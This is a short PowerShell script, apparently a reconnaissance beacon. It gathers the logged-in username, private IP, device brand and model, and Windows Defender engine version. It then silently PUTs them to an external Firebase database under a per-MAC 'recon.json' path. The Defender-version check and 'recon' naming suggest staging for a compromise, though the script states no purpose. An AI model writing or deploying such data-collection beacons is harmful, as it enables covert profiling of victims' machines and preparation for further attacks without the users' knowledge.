# Import the required module for Invoke-RestMethod
# Import-Module -Name Microsoft.PowerShell.Utility

# Get the primary network adapter
$primaryAdapter = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Sort-Object -Property InterfaceIndex | Select-Object -First 1
# Get Device username
$deviceUsername = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName).Split('\')[1]
# Get Device private IP address
$deviceIP = (Get-NetIPAddress -InterfaceIndex $primaryAdapter.InterfaceIndex -AddressFamily IPv4).IPAddress
# Get Device Brand
$deviceBrand = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer)
# Get Device Model
$deviceModel = (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model)
# Get Device Windows Defender version
$defenderVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates" -Name "EngineVersion").EngineVersion

# cUrl the data to the Firebase Realtime Database
$hardware = @{
    "User" = $deviceUsername
    "IP" = $deviceIP
    "Brand" = $deviceBrand
    "Model" = $deviceModel
    "Defender" = $defenderVersion
} | ConvertTo-Json

Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '/recon.json') -Method PUT -Body $hardware | Out-Null
